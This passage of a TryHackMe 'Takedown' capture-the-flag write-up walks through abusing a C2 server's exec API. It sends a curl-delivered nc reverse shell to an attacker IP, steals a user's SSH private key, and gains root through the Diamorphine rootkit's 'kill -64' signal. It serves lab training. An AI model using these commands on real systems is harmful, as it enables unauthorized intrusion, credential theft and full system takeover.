                    msg = f"New commnad to execute: {command_to_execute_next}"
                    app.logger.debug(msg)
                    print(msg)
                    return msg, 200
                else:
                    return "Bad request", 400
            else:
                abort(404)
        else:
            abort(404)
    else:
        abort(404)
```

```py
available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]
```

**The `exec` usage is: `exec {command_here}`.**

**In `/api/agents/<uid>/exec` route, I can execute any command, with the POST json parameter `cmd`.**

Armed with above information, we can get a reverse shell via: **Execute arbitrary command via `/api/agents/<uid>/exec` route.**

# Initial Foothold

**First, we could confirm the target machine can reach to our attacker machine or not via `ping`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"cmd":"exec ping -c 4 10.8.27.249"}' http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/exec
New commnad to execute: exec ping -c 4 10.8.27.249

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:26:45.116192 IP takedown.thm.local > 10.8.27.249: ICMP echo request, id 1, seq 1, length 64
02:26:45.116441 IP 10.8.27.249 > takedown.thm.local: ICMP echo reply, id 1, seq 1, length 64
02:26:46.117671 IP takedown.thm.local > 10.8.27.249: ICMP echo request, id 1, seq 2, length 64
02:26:46.117775 IP 10.8.27.249 > takedown.thm.local: ICMP echo reply, id 1, seq 2, length 64
02:26:47.118540 IP takedown.thm.local > 10.8.27.249: ICMP echo request, id 1, seq 3, length 64
02:26:47.118556 IP 10.8.27.249 > takedown.thm.local: ICMP echo reply, id 1, seq 3, length 64
02:26:48.120482 IP takedown.thm.local > 10.8.27.249: ICMP echo request, id 1, seq 4, length 64
02:26:48.120525 IP 10.8.27.249 > takedown.thm.local: ICMP echo reply, id 1, seq 4, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

We successfully received 4 ICMP ping!

**Next, setup a `nc` listener:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# nc -lnvp 443 
listening on [any] 443 ...
```

**Finally, send the reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"cmd":"exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.27.249 443 >/tmp/f"}' http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/exec
New commnad to execute: exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.27.249 443 >/tmp/f
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.8.27.249] from (UNKNOWN) [10.10.51.56] 58602
bash: cannot set terminal process group (1918): Inappropriate ioctl for device
bash: no job control in this shell
webadmin-lowpriv@www-infinity:~$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
webadmin-lowpriv
www-infinity
uid=1001(webadmin-lowpriv) gid=1001(webadmin-lowpriv) groups=1001(webadmin-lowpriv)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:fc:98:22:cd:83 brd ff:ff:ff:ff:ff:ff
    inet 10.10.51.56/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3474sec preferred_lft 3474sec
    inet6 fe80::fc:98ff:fe22:cd83/64 scope link 
       valid_lft forever preferred_lft forever
3: br-3ed03a0a7af6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:aa:54:97:15 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-3ed03a0a7af6
       valid_lft forever preferred_lft forever
    inet6 fe80::42:aaff:fe54:9715/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:6d:9e:18:4c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: vethb1017b2@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3ed03a0a7af6 state UP group default 
    link/ether fe:85:b0:f4:f5:69 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fc85:b0ff:fef4:f569/64 scope link 
       valid_lft forever preferred_lft forever
8: veth1e8479a@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3ed03a0a7af6 state UP group default 
    link/ether b2:a0:ee:63:ae:57 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::b0a0:eeff:fe63:ae57/64 scope link 
       valid_lft forever preferred_lft forever
10: veth91fef9b@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3ed03a0a7af6 state UP group default 
    link/ether e6:cf:ef:31:67:cc brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::e4cf:efff:fe31:67cc/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `webadmin-lowpriv`!

**user.txt:**
```
webadmin-lowpriv@www-infinity:~$ cat /home/webadmin-lowpriv/user.txt
THM{Redacted}
```

**Stable shell:**

In the home directory of `webadmin-lowpriv` user, **there is a `.ssh` directory that contains a private SSH key!**

```
webadmin-lowpriv@www-infinity:~$ ls -lah .ssh
total 20K
drwx------ 2 webadmin-lowpriv webadmin-lowpriv 4.0K Jul 27 01:50 .
drwxr-xr-x 5 webadmin-lowpriv webadmin-lowpriv 4.0K Jul 27 02:45 ..
-rw-rw-r-- 1 webadmin-lowpriv webadmin-lowpriv  583 Jul 27 01:50 authorized_keys
-rw------- 1 webadmin-lowpriv webadmin-lowpriv 2.6K Jul 27 01:49 id_rsa
-rw-r--r-- 1 webadmin-lowpriv webadmin-lowpriv  583 Jul 27 01:49 id_rsa.pub

webadmin-lowpriv@www-infinity:~$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA2y28m9zvL55VUnGvjKvJoO/puyib5S2W5dK6j9RS0IunKooAeiTj
h7lfUiVmHi+Jrf9SwGvU386UneEsvJ6KSNZvIezrfmHltx3igasWldeeGsxuA4qLHsQCy0
5aZyWnnSm5z0bi1uUDUeb75H3MX4rxXT0JrsryYYjd9Vz4cNGW5zk/J4m6O3PAla+notFn
[...]
```

**Since the SSH port is opened, I'll copy and paste that private key to my attacker machine:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# nano webadmin-lowpriv_id_rsa
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# chmod 600 webadmin-lowpriv_id_rsa
```

**Then, we can SSH into user `webadmin-lowpriv` with the private key!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# ssh -i webadmin-lowpriv_id_rsa webadmin-lowpriv@$RHOSTS
[...]
webadmin-lowpriv@www-infinity:~$ whoami;hostname;id
webadmin-lowpriv
www-infinity
uid=1001(webadmin-lowpriv) gid=1001(webadmin-lowpriv) groups=1001(webadmin-lowpriv)
```

# Privilege Escalation

## webadmin-lowpriv to root

**In `pspy`, I found that there is a weird binary is running:**
```
webadmin-lowpriv@www-infinity:~$ /tmp/pspy
[...]
2022/10/02 06:59:59 CMD: UID=1001 PID=1918   | /usr/share/diamorphine_secret/svcgh0st

webadmin-lowpriv@www-infinity:~$ ls -lah /usr/share/diamorphine_secret/svcgh0st
-rwxr-xr-x 1 webadmin-lowpriv webadmin-lowpriv 171K Jul 26 21:39 /usr/share/diamorphine_secret/svcgh0st

webadmin-lowpriv@www-infinity:~$ file /usr/share/diamorphine_secret/svcgh0st
/usr/share/diamorphine_secret/svcgh0st: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d677fc235a38037ad571588beee071b1f673d321, for GNU/Linux 3.2.0, stripped
```

**I also discovered some weird files in `/dev/shm`:**
```
webadmin-lowpriv@www-infinity:~$ ls -lah /dev/shm
total 68K
drwxrwxrwt  2 root root  280 Oct  2 03:29 .
drwxr-xr-x 18 root root 3.9K Oct  2 03:30 ..
-rw-r--r--  1 root root  11K Oct  2 03:29 diamorphine.c
-rw-r--r--  1 root root  642 Oct  2 03:29 diamorphine.h
-rw-r--r--  1 root root  12K Oct  2 03:29 diamorphine.ko
-rw-r--r--  1 root root   29 Oct  2 03:29 diamorphine.mod
-rw-r--r--  1 root root 1.2K Oct  2 03:29 diamorphine.mod.c
-rw-r--r--  1 root root 4.0K Oct  2 03:29 diamorphine.mod.o
-rw-r--r--  1 root root 9.1K Oct  2 03:29 diamorphine.o
-rw-r--r--  1 root root 1.5K Oct  2 03:29 LICENSE.txt
-rw-r--r--  1 root root  190 Oct  2 03:29 Makefile
-rw-r--r--  1 root root   29 Oct  2 03:29 modules.order
-rw-r--r--  1 root root    0 Oct  2 03:29 Module.symvers
-rw-r--r--  1 root root 1.7K Oct  2 03:29 README.md
```

After some googling, I found that binary is a **[rootkit](https://github.com/m0nad/Diamorphine) from a GitHub repository** :

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Takedown/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Takedown/images/a2.png)

```
Sending a signal 64(to any pid) makes the given user become root;
```

**Hmm... So, that means I can escalate to root by sending a signal 64 to any pid via `kill`??**
```
webadmin-lowpriv@www-infinity:~$ kill -64 1337
webadmin-lowpriv@www-infinity:~$ whoami;id
root
uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
```

And I'm root! :D

# Rooted

**root.txt:**
```
webadmin-lowpriv@www-infinity:~$ cat /root/root.txt 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*****(/****/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@#***&@/,,,,,,,,%@#***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&**#(,,,,,,,,,,,,*,,,,,@**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@(**/,,,,,,,,,,,,,,,,,,**,,,,/**@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%**,,,,,,,,,,,,#&@@%*,,,,,,***,,***@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/**,***,,,,(@/*********/@@,,,,****,**%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@*******,,,/*,*************,,/#,,,******#@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@******,,,,,,******************,,,,,******(@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@******,,,,,**&@@@@@****(@@@@@&***,,,,******%@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(*****,,,,/@@@@@@@@@@***@@@@@@@@@@**,,,******@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@*****,,,/@@@@*****%@****/@#****/@@@@/,,,*****/@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@(***,,,,@@@@@@@@@@@***(&(***@@@@@@@@@@@*,,,****@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@***,,,,@&&@@@@@@@%@@@@@@@@@@@#@@@@@@@#&@*,,,***%@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#**,,,,***@@@@@@@@@@@@@@@@@@@@@@@@@@@@%***,,,****@@@@@@@@@@@@@@@@@
@@@@@@@@@@&****,,,,***/@@@#@@@@@@/*****(@@@@@@%@@@/***,,,******@@@@@@@@@@@@@@@
@@@@@@@@@*******,,,,***@@@@(@@@@@******/@@@@@%@@@%***,,,,*******/@@@@@@@@@@@@@
@@@@@@@@&********,,,****@@@@@*&@@@@#*%@@@@%*@@@@%****,,,*********@@@@@@@@@@@@@
@@@@@@@@@@(********,,****#@@@@&***********@@@@@/****,,,********@@@@@@@@@@@@@@@
@@@@@@@@@@@@%*******,,*****&@(@(*********#@/@%*****,,*******/@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@/******,**,****#@(*******#@/****,**********&@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/******,,*****@@****/@@*****,,*******&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@#*****,,*****@@&@&*****,,*****(@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@/***,,***********,,***/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/**,,*****,,**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/,,,/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

THANKS FOR PLAYING :D -husky

THM{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. Malware Analysis
3. Reverse Engineering
4. Command Injection via `/api/agents/<uid>/exec` route
5. Privilege Escalation via Diamorphine Linux Rootkit